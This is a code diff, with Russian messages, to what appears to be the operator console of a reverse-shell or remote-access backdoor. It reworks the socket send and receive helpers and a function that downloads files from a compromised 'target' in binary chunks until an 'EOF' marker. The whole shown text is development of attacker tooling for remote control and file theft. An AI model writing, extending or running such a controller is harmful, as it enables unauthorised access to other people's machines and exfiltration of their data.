@@ -8,16 +8,25 @@ import datetime
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")
 
 
-def reliable_send(data, target):
-    json_data = json.dumps(data).encode()
-    target.send(json_data)
+def reliable_send(data, sock, binary=False):
+    try:
+        if binary:
+            sock.sendall(data)  
+        else:
+            json_data = json.dumps(data).encode()
+            sock.send(json_data)
+    except Exception:
+        pass
 
 
-def reliable_recv(target):
+def reliable_recv(sock, binary=False):
     json_data = b""
     while True:
         try:
-            json_data = json_data + target.recv(1024)
+            chunk = sock.recv(1024)
+            if binary:
+                return chunk  
+            json_data += chunk
             return json.loads(json_data.decode())
         except ValueError:
             continue
@@ -46,15 +55,16 @@ def show_help():
 def download_file(command, target):
     file_name = command[9:].strip()
     try:
-        file_data = reliable_recv(target)
-        if isinstance(file_data, str) and file_data.startswith("!!"):
-            logging.error(file_data)
-        else:
-            with open(file_name, "wb") as file:
-                file.write(base64.b64decode(file_data))
-            logging.info(f"Файл {file_name} успешно загружен")
+        with open(file_name, "wb") as file:
+            while True:
+                chunk = reliable_recv(target, binary=True)  
+                if chunk == b"EOF":  
+                    break
+                file.write(chunk)
+        print(f"[+] Файл {file_name} успешно загружен")
     except Exception as e:
-        logging.error(f"Ошибка загрузки файла {file_name}: {e}")
+        print(f"[!!] Ошибка загрузки файла {file_name}: {e}")
+
 
 
 def upload_file(command, target):
